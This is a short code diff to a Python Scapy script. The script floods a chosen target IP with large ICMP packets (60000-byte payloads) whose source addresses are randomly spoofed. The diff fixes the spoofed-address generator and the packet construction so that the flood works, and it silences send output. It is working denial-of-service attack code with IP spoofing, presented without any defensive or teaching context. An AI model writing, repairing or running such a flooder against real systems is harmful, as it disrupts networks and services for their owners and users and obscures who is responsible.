@@ -13,7 +13,7 @@ def random_address_generator():
     addr[1] = str(random.randrange(0,255))
     addr[2] = str(random.randrange(0,255))
     addr[3] = str(random.randrange(2,254))
-    return (addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d)
+    return (addr[0] + d + addr[1] + d + addr[2] + d + addr[3])
 
 
 def ping(targetedIp, targetedPort, duration):
@@ -21,8 +21,8 @@ def ping(targetedIp, targetedPort, duration):
     for _ in range(duration):
         spoofed_ip = random_address_generator()
         ip_header = IP(src=spoofed_ip, dst=targetedIp)
-        packet = ip_header/ICMP(sport=RandShort(),dport=targetedPort)/("d"*60000)
-        send(packet)
+        packet = ip_header/ICMP()/("d"*60000)
+        send(packet, verbose=0)
         
 if __name__ == "__main__":
 
